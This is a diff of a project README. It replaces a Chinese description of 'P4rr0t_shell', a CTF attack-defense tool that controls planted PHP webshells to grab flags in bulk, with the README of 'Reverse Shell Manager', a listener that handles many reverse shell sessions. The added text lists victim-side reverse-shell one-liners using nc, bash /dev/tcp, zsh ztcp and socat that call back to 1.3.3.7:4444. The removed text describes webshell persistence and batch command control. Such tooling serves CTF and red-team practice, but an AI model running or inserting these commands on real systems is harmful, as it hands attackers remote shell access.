@@ -1,60 +1,73 @@
-# P4rr0t_shell
+# Reverse Shell Manager
 
----  
+```
+A multiple reverse shell sessions/clients manager via terminal
+```
+**This project will not continue develope anymore.**  
+**The reborn project (Platypus) has been released at https://github.com/WangYihang/Platypus**  
 
-### 目录结构  
-```shell
-.
-├── a.php
-├── awd.sh
-├── flag
-├── flag.txt
-├── log
-├── README.md
-├── seg.log
-└── target.txt
+#### [**Platypus**](https://github.com/WangYihang/Platypus)
+  * More stable
+  * More features
+  * Upgrade common reverse shell session to full interactive seession
+  * Reverse shell as a Service
+  * RESTful API
+  * ...
+
+#### Attacker side
+```
+python Reverse-Shell-Manager.py 0.0.0.0 4444
+```
+#### Victims sides
+> Linux
+```
+nc -e /bin/bash 1.3.3.7 4444
+bash -c 'bash -i >/dev/tcp/1.3.3.7/4444 0>&1'
+zsh -c 'zmodload zsh/net/tcp && ztcp 1.3.3.7 4444 && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:1.3.3.7:4444  
+```
+> Windows
+```
+nc.exe -e /bin/bash 1.3.3.7 4444
 ```
 
-### 主要功能  
+#### Simple Example Video 
 
-主要支持php木马,支持批量拿flag,群控,命令控制,批量扫描,不死.
+[![asciicast](https://asciinema.org/a/143640.png)](https://asciinema.org/a/143640)
 
-使用方式如下:  
-```shell
-    ____   __ __               ____   __
-   / __ \ / // /  _____ _____ / __ \ / /_
-  / /_/ // // /_ / ___// ___// / / // __/
- / ____//__  __// /   / /   / /_/ // /_
-/_/       /_/  /_/   /_/    \____/ \__/
-[+]1. CommandMode
-[+]2. ReadAllFlag
-[+]3. SegmentScan
-[+]4. Exit
->1
-[+]Input Target url>
-127.0.0.1/.a.php
-www-data@/var/www/html>ls -al
-ls -al
-ls -alstring(521) "total 48
-drwxr-xr-x 5 root root  4096 Aug 16 14:43 .
-drwxr-xr-x 9 root root  4096 Aug 14 14:30 ..
--rwxrwxrwx 1 root root   330 Aug 16 14:45 .a.php
--rw-r--r-- 1 root root   107 Aug 15 00:00 .index.php
--rw-r--r-- 1 root root   152 Aug 15 21:54 a.php
-drwxr-xr-x 3 root root  4096 Aug 16 16:45 awd
-drwxr-xr-x 2 root root  4096 Aug 14 14:30 blockchain
--rw-r--r-- 1 root root 10480 Feb 22 14:19 index.apache.html
--rw-r--r-- 1 root root   612 Oct 17  2018 index.nginx-debian.html
-drwxr-xr-x 2 root root  4096 Aug 14 14:30 shell
-"
-www-data@/var/www/html>
+#### YouTube Example
+> https://youtu.be/AoS-q1MGw30  
+
+
+#### TODO
+- [x] Add an item to crontab
+- [x] Delete an item from crontab
+- [ ] create a class to hold Master
+- [ ] select/epoll
+
+#### Bugs
+
+- [x] A victim is connected but didn't add to online list
+- [ ] socket stuck on rece()
+
+#### LICENSE
+
 ```
+THE DRINKWARE LICENSE
 
-### 配置方式
-在target.txt中填写靶机的url地址,flag将输入到flag.txt中.  
+<wangyihanger@gmail.com> wrote this file. As long as 
+you retain this notice you can do whatever you want 
+with this stuff. If we meet some day, and you think 
+this stuff is worth it, you can buy me the following
+drink(s) in return.
 
-```plain
-http://127.0.0.1/.a.php
-http://192.168.100.22/.fuck.php
+Red Bull
+JDB
+Coffee
+Sprite
+Cola
+Harbin Beer
+etc
+
+Wang Yihang
 ```
-连接脚本的密码在awd.sh中进行修改.
